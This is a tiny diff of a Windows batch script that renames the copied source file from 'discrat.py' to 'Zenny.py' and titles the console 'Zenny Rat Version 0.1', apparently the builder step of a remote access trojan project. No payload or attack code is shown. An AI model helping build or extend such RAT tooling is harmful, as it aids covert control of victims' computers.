@@ -2,7 +2,7 @@
 setlocal
 
 :main
-copy discrat.py building.py
+copy Zenny.py building.py
 chcp 65001
 title Zenny Rat Version 0.1
 mode con: cols=200
